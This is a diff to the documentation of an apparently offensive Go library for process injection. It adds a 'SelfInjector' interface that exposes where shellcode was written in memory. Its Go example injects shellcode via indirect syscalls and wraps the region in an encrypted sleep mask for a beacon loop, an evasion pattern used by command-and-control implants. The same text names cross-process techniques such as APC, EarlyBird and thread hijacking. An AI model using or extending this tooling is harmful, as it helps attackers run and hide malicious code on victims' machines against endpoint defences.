@@ -108,6 +108,62 @@ p := inject.NewPipeline(
 err := p.Inject(shellcode)
 ```
 
+## SelfInjector — Getting the Region Back
+
+Self-process injectors (`MethodCreateThread`, `MethodCreateFiber`,
+`MethodEtwpCreateEtwThread` on Windows; `MethodProcMem` on Linux) place the
+shellcode inside the current process. The base `Injector` interface throws
+that address away, forcing callers who want to sleep-mask or wipe the
+region to compute it themselves. The optional `SelfInjector` interface
+exposes it:
+
+```go
+type Region struct {
+    Addr uintptr
+    Size uintptr
+}
+
+type SelfInjector interface {
+    Injector
+    InjectedRegion() (Region, bool)
+}
+```
+
+Type-assert the `Injector` you got back and you can feed the region
+directly into `evasion/sleepmask` for the beacon-loop pattern:
+
+```go
+inj, _ := inject.NewWindowsInjector(&inject.WindowsConfig{
+    Config:        inject.Config{Method: inject.MethodCreateThread},
+    SyscallMethod: wsyscall.MethodIndirect,
+})
+if err := inj.Inject(shellcode); err != nil { return err }
+
+if self, ok := inj.(inject.SelfInjector); ok {
+    if r, ok := self.InjectedRegion(); ok {
+        mask := sleepmask.New(sleepmask.Region{Addr: r.Addr, Size: r.Size})
+        for {
+            // ... beacon work ...
+            mask.Sleep(30 * time.Second)
+        }
+    }
+}
+```
+
+Contract details:
+
+- Returns `(Region{}, false)` before the first successful `Inject`.
+- Returns `(Region{}, false)` on cross-process methods (CRT, APC, EarlyBird,
+  ThreadHijack, Rtl, NtQueueApcThreadEx) — the region lives in the target
+  process, not ours.
+- Failed `Inject` calls do **not** clobber a previously-published region.
+- All three decorators (`WithValidation`, `WithCPUDelay`, `WithXOR`) and
+  the `Pipeline` transparently forward `InjectedRegion` to the wrapped
+  injector, so the pattern works at the end of any `Chain`.
+
+See `evasion/sleepmask/doc.go` and `docs/techniques/evasion/sleep-mask.md`
+for the encrypted-sleep side of this pattern.
+
 ## Syscall Methods
 
 Every injection method supports four syscall routing modes via `WindowsConfig.SyscallMethod`:
